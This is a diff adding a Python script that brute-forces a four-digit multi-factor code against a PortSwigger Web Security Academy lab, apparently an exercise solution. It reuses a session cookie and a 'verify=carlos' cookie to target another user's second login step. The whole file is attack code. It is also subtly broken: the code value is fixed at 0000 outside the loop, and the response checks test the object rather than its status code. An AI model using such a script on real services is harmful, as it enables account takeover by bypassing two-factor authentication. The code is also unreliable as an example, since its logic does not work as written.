@@ -1,0 +1,29 @@
+import requests
+
+i = 0
+
+cookies = {
+"session":"lGNJjKSiQNoBCRF6zz236N0qazKDxo7X",
+"verify":"carlos"
+}
+
+headers = {
+"Origin":"https://ac1b1f591efb52f2801f7b6d00040021.web-security-academy.net",
+"Referer":"https://ac1b1f591efb52f2801f7b6d00040021.web-security-academy.net/login2",
+"Upgrade-Insecure-Requests":"1",
+"Dnt":"1",
+"Sec-Gpc":"1",
+"Te":"trailers",
+"mfa-code":str(str(i).zfill(4))
+}
+
+for i in range(10000):
+  r = requests.post("https://ac1b1f591efb52f2801f7b6d00040021.web-security-academy.net/login2",cookies=cookies,headers=headers)
+  if('200' in r):
+    print("Incorrect PIN code: "+str(i))
+  elif('302' in r):
+    print("Redirected! PIN found: " + str(i))
+  else:
+    print("Status code: " + str(r))
+
+
